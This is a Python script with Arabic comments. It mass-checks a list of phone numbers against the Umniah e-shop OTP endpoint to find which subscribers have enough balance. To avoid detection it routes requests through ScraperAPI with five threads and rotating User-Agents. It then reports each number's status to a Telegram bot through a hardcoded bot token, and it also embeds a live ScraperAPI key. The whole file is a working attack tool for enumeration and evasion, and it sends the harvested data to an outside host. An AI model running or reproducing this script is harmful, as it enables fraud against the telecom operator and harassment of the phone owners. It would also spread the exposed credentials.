import requests
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

# User-Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/152.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
]

BASE_COOKIES = {
    'wp_ga4_customerGroup': 'NOT%20LOGGED%20IN',
    '_gcl_au': '1.1.1488191976.1788724682',
    '_ga': 'GA1.1.1652587676.1788724683',
    '_twpid': 'tw.1788724682629.93328193554679845',
    '_fbp': 'fb.1.1788724682843.15328305795544321',
    'user_allowed_save_cookie': '%7B%221%22%3A1%7D',
}

BASE_HEADERS = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://eshop.umniah.com',
    'referer': 'https://eshop.umniah.com/ar/vendic/index/checkotp/',
    'priority': 'u=1, i',
    'sec-ch-ua': '"Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
}

# معلومات البوت
TELEGRAM_BOT_TOKEN = '7327256170:AAEiQ_F_BI1V9iUHzgPPui7JRwqGnj6Jys4'
TELEGRAM_CHAT_ID = '6873334348'
TELEGRAM_API = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'

# ⚙️ ScraperAPI Configuration
SCRAPER_API_KEY = 'e42b050dcb697cf3ccd3d663edf43aea'
SCRAPER_API_URL = 'https://api.scraperapi.com/'

# الإعدادات
NUM_THREADS = 5
DELAY_BETWEEN_REQUESTS = 0.2  # تأخير بسيط جداً (ScraperAPI يتحمل السرعة)

def get_random_user_agent():
    """الحصول على User-Agent عشوائي"""
    return random.choice(USER_AGENTS)

def get_headers():
    """الحصول على headers مع User-Agent عشوائي"""
    headers = BASE_HEADERS.copy()
    headers['user-agent'] = get_random_user_agent()
    return headers

def check_phone(phone_number, index, total):
    """فحص رقم واحد باستخدام ScraperAPI"""
    try:
        # تأخير بسيط جداً
        time.sleep(random.uniform(0.1, DELAY_BETWEEN_REQUESTS))
        
        json_data = {
            'phone_number': phone_number,
            'request': 'generate',
            'orderid': '727165',
        }
        
        headers = get_headers()
        
        # استدعاء ScraperAPI
        payload = {
            'api_key': SCRAPER_API_KEY,
            'url': 'https://eshop.umniah.com/ar/vendic/index/checkotp/',
        }
        
        response = requests.post(
            SCRAPER_API_URL,
            params=payload,
            headers=headers,
            json=json_data,
            timeout=15
        )
        
        if response.status_code == 200:
            try:
                response_data = response.json()
            except:
                print(f"[{index}/{total}] ⚠️ {phone_number} - خطأ في قراءة JSON")
                return ('json_error', phone_number, None)
            
            # التحقق من data1 == success
            if response_data.get('data1') == 'success':
                message = f"""
╔══════════════════════════════════╗
║  ✅ حسابك يحتوي على رصيد ✅       ║
╚══════════════════════════════════╝

📱 رقم الهاتف: {phone_number}
📦 رقم الطلب: 727165
💰 الحالة: يوجد رصيد كافي

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✨ Status: SUCCESS
📊 الرقم: {index}/{total}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
                print(f"[{index}/{total}] ✅ {phone_number} - يوجد رصيد")
                return ('success', phone_number, message)
            
            # التحقق من عدم وجود رصيد
            data2_text = str(response_data.get('data2', '')).lower()
            if 'balance' in data2_text or 'رصيد' in data2_text or 'insufficient' in data2_text:
                message = f"""
╔══════════════════════════════════╗
║     ❌ لا يوجد رصيد كافي ❌        ║
╚══════════════════════════════════╝

📱 رقم الهاتف: {phone_number}
📦 رقم الطلب: 727165
💰 الحالة: رصيد غير كافي

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ الرسالة: لا يوجد رصيد كافي
📊 الرقم: {index}/{total}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
                print(f"[{index}/{total}] ⚠️ {phone_number} - لا يوجد رصيد")
                return ('no_balance', phone_number, message)
            else:
                print(f"[{index}/{total}] ❓ {phone_number} - رد: {response_data.get('data2', 'N/A')}")
                return ('unknown', phone_number, None)
        
        elif response.status_code == 403:
            print(f"[{index}/{total}] 🚫 {phone_number} - محظور (403)")
            return ('blocked', phone_number, None)
        
        elif response.status_code == 429:
            print(f"[{index}/{total}] ⚠️ {phone_number} - الكثير من الطلبات (429)")
            return ('rate_limit', phone_number, None)
        
        else:
            print(f"[{index}/{total}] ❌ {phone_number} - HTTP {response.status_code}")
            return ('error', phone_number, None)
    
    except requests.Timeout:
        print(f"[{index}/{total}] ⏱️ {phone_number} - timeout")
        return ('timeout', phone_number, None)
    
    except requests.ConnectionError as e:
        print(f"[{index}/{total}] 🔌 {phone_number} - فشل الاتصال")
        return ('connection_error', phone_number, None)
    
    except Exception as e:
        print(f"[{index}/{total}] ❌ {phone_number} - {type(e).__name__}")
        return ('error', phone_number, None)

def send_to_telegram(message):
    """إرسال رسالة للبوت"""
    try:
        telegram_data = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
        }
        response = requests.post(TELEGRAM_API, json=telegram_data, timeout=5)
        return response.status_code == 200
    except Exception as e:
        print(f"❌ خطأ في إرسال البوت: {str(e)}")
        return False

def remove_from_file(phone_number):
    """حذف الرقم من الملف"""
    try:
        with open('lu1.txt', 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        new_lines = [line for line in lines if line.strip() != phone_number]
        
        with open('lu1.txt', 'w', encoding='utf-8') as f:
            f.writelines(new_lines)
        
        return True
    except Exception as e:
        print(f"⚠️ فشل حذف {phone_number}: {str(e)}")
        return False

def main():
    try:
        with open('lu1.txt', 'r', encoding='utf-8') as f:
            phone_numbers = [line.strip() for line in f.readlines() if line.strip()]
        
        total = len(phone_numbers)
        
        if total == 0:
            print("ℹ️ لا توجد أرقام في الملف!")
            return
        
        print(f"✅ تم قراءة {total} أرقام من الملف")
        print(f"🚀 بدء الفحص...")
        print(f"🔄 عدد الخيوط: {NUM_THREADS}")
        print(f"🌐 استخدام ScraperAPI: ✅")
        print(f"🎲 تغيير User-Agent عشوائياً: ✅")
        print(f"⚡ سرعة: عالية جداً (بدون انقطاع)\n")
        
        success_count = 0
        no_balance_count = 0
        blocked_count = 0
        rate_limit_count = 0
        failed_count = 0
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
            futures = {}
            for idx, phone in enumerate(phone_numbers, 1):
                future = executor.submit(check_phone, phone, idx, total)
                futures[future] = phone
            
            for future in as_completed(futures):
                phone = futures[future]
                
                try:
                    status, phone_num, message = future.result(timeout=20)
                    
                    if status == 'success':
                        success_count += 1
                        if message:
                            send_to_telegram(message)
                        remove_from_file(phone_num)
                    
                    elif status == 'no_balance':
                        no_balance_count += 1
                        if message:
                            send_to_telegram(message)
                        remove_from_file(phone_num)
                    
                    elif status == 'blocked':
                        blocked_count += 1
                        remove_from_file(phone_num)
                    
                    elif status == 'rate_limit':
                        rate_limit_count += 1
                        # ما نحذفها، نحاول بعدين
                    
                    else:
                        failed_count += 1
                        remove_from_file(phone_num)
                
                except Exception as e:
                    failed_count += 1
                    print(f"❌ خطأ: {str(e)}")
                    remove_from_file(phone)
        
        elapsed_time = time.time() - start_time
        
        # الإحصائيات
        print(f"\n{'='*60}")
        print(f"📊 النتائج النهائية:")
        print(f"{'='*60}")
        print(f"✅ يوجد رصيد: {success_count}")
        print(f"❌ لا يوجد رصيد: {no_balance_count}")
        print(f"🚫 محظور: {blocked_count}")
        print(f"⚠️ حد الطلبات: {rate_limit_count}")
        print(f"❌ فشل: {failed_count}")
        print(f"📊 المجموع: {total}")
        print(f"⏱️ الوقت: {elapsed_time:.2f} ثانية ({elapsed_time/60:.1f} دقيقة)")
        if elapsed_time > 0:
            print(f"🚀 السرعة: {total/elapsed_time:.1f} رقم/ثانية")
        print(f"{'='*60}\n")

    except FileNotFoundError:
        print("❌ ملف lu1.txt غير موجود في المجلد الحالي!")
    except KeyboardInterrupt:
        print("\n\n⛔ تم التوقف بواسطة المستخدم")
    except Exception as e:
        print(f"❌ خطأ: {str(e)}")

if __name__ == "__main__":
    main()
